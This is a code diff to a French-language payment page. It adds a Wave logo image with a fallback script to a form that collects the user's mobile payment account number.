@@ -149,6 +149,8 @@ button.buy{border:0;width:100%;font:inherit;font-size:12px;font-weight:800;curso
 .co .go{height:52px;border-radius:26px;font-size:14px;letter-spacing:.5px;box-shadow:0 0 22px var(--glow)}
 .paid{background:linear-gradient(110deg,var(--accent) 35%,#fff 50%,var(--accent) 65%);background-size:220% 100%;animation:pulse 1.8s infinite,shine 2.6s linear infinite}
 button.buy{border-radius:17px;letter-spacing:.5px}
+.wv img{display:block;width:100%;border-radius:4px;margin-bottom:8px}
+#wvTxt{display:none}
 @media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
 </style>
 </head>
@@ -185,7 +187,7 @@ button.buy{border-radius:17px;letter-spacing:.5px}
         <p>Veuillez remplir votre mode de paiement et le compte de paiement réel que vous utiliserez pour effectuer le paiement.</p>
         <p class='amt'>Montant de paiement : <b id='amt1'></b></p>
         <p>Veuillez sélectionner un mode de paiement</p>
-        <div class='wv'><span>wave</span>WAVE<em>bientôt</em></div>
+        <div class='wv'><img id='wvImg' src='https://files.catbox.moe/6zomif.jpg' alt='Wave'><span id='wvTxt'>wave</span>WAVE<em>bientôt</em></div>
         <div class='phone'><select id='ctry' aria-label='Pays'></select><input id='pnum' type='tel' inputmode='tel' autocomplete='tel' placeholder='Votre compte de paiement réel'></div>
         <div class='err' id='perr' role='alert'></div>
         <div class='warn'>Veuillez remplir votre compte de paiement avec précision. Un remplissage incorrect peut entraîner la perte des fonds transférés.</div>
@@ -371,6 +373,11 @@ document.querySelectorAll('[data-copy]').forEach(b=>b.addEventListener('click',(
   const fb=()=>{try{const t=document.createElement('textarea');t.value=txt;document.body.append(t);t.select();document.execCommand('copy');t.remove();done()}catch(e){}};
   try{navigator.clipboard.writeText(txt).then(done,fb)}catch(e){fb()}
 }));
+
+const wvImg=document.getElementById('wvImg');
+function wvFallback(){wvImg.style.display='none';document.getElementById('wvTxt').style.display='block'}
+wvImg.addEventListener('error',wvFallback);
+if(wvImg.complete&&wvImg.naturalWidth===0)wvFallback();
 
 /* Pairing */
 const form=document.getElementById('pairForm'),result=document.getElementById('result'),submit=document.getElementById('submitBtn');
